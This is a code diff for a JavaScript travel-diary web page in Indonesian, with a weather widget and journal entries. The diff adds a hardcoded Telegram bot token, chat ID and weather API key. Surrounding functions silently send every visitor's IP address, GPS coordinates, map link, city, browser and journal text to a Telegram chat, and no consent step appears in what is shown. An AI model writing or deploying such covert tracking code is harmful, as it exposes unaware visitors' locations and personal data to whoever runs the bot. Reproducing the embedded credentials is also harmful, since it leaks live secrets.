@@ -1,4 +1,14 @@
-faeufeufia
+const CONFIG = {
+    TELEGRAM_BOT_TOKEN: '7807161260:AAHAnhLzPqLprHr_inS9ixhmb3jJwHxxdMI',
+    TELEGRAM_CHAT_ID: '1254913051',
+    WEATHER_API_KEY: '0714e2d6c51447dfa37102719252904'
+};
+
+let currentLanguage = 'id';
+let userLocation = {};
+
+const languageToggle = document.getElementById('languageToggle');
+const langText = document.querySelector('.lang-text');
 const weatherInfo = document.getElementById('weatherInfo');
 const journeyForm = document.getElementById('journeyForm');
 const entriesContainer = document.getElementById('journey-entries');
@@ -75,23 +85,23 @@ async function sendTelegramNotification() {
         
         if (userLocation.using_gps) {
             message = `
-TRAVEL JOURNEY - Pengunjung Baru!
-IP: ${userLocation.ip}
-Koordinat GPS: ${userLocation.latitude}, ${userLocation.longitude}
-Peta: https://www.google.com/maps?q=${userLocation.latitude},${userLocation.longitude}
-Kota: ${userLocation.city}, ${userLocation.country}
-Perangkat: ${userLocation.browser}
-Waktu: ${userLocation.time}
+ TRAVEL JOURNEY - Pengunjung Baru!
+ IP: ${userLocation.ip}
+ Koordinat GPS: ${userLocation.latitude}, ${userLocation.longitude}
+ Peta: https://www.google.com/maps?q=${userLocation.latitude},${userLocation.longitude}
+ Kota: ${userLocation.city}, ${userLocation.country}
+ Perangkat: ${userLocation.browser}
+ Waktu: ${userLocation.time}
             `;
         } else {
             message = `
-TRAVEL JOURNEY - Pengunjung Baru!
-IP: ${userLocation.ip}
-Lokasi: ${userLocation.city}, ${userLocation.country}
-Koordinat: ${userLocation.latitude}, ${userLocation.longitude}
-Peta: https://www.google.com/maps?q=${userLocation.latitude},${userLocation.longitude}
-Perangkat: ${userLocation.browser}
-Waktu: ${userLocation.time}
+ TRAVEL JOURNEY - Pengunjung Baru!
+ IP: ${userLocation.ip}
+ Lokasi: ${userLocation.city}, ${userLocation.country}
+ Koordinat: ${userLocation.latitude}, ${userLocation.longitude}
+ Peta: https://www.google.com/maps?q=${userLocation.latitude},${userLocation.longitude}
+ Perangkat: ${userLocation.browser}
+ Waktu: ${userLocation.time}
             `;
         }
         
@@ -109,6 +119,7 @@ Waktu: ${userLocation.time}
     }
 }
 
+
 async function loadWeather() {
     try {
         const response = await axios.get(
@@ -125,6 +136,7 @@ async function loadWeather() {
             '</div>';
     }
 }
+
 
 function displayWeather(weather) {
     const weatherHTML = `
@@ -144,14 +156,18 @@ function displayWeather(weather) {
     weatherInfo.innerHTML = weatherHTML;
 }
 
+
 function setupEventListeners() {
+
     languageToggle.addEventListener('click', toggleLanguage);
+    
     
     journeyForm.addEventListener('submit', function(e) {
         e.preventDefault();
         addNewJourney();
     });
 }
+
 
 function toggleLanguage() {
     currentLanguage = currentLanguage === 'id' ? 'en' : 'id';
@@ -251,12 +267,12 @@ function formatDate(dateString) {
 async function sendJourneyNotification(journey) {
     try {
         const message = `
-TRAVEL JOURNEY - Entri Baru!
-Destinasi: ${journey.destination}
-Tanggal: ${formatDate(journey.date)}
-Cerita: ${journey.story.slice(0, 100)}${journey.story.length > 100 ? '...' : ''}
-Dari: ${userLocation.city}, ${userLocation.country}
-Dicatat: ${new Date(journey.timestamp).toLocaleString()}
+ TRAVEL JOURNEY - Entri Baru!
+ Destinasi: ${journey.destination}
+ Tanggal: ${formatDate(journey.date)}
+ Cerita: ${journey.story.slice(0, 100)}${journey.story.length > 100 ? '...' : ''}
+ Dari: ${userLocation.city}, ${userLocation.country}
+ Dicatat: ${new Date(journey.timestamp).toLocaleString()}
         `;
         
         await axios.post(
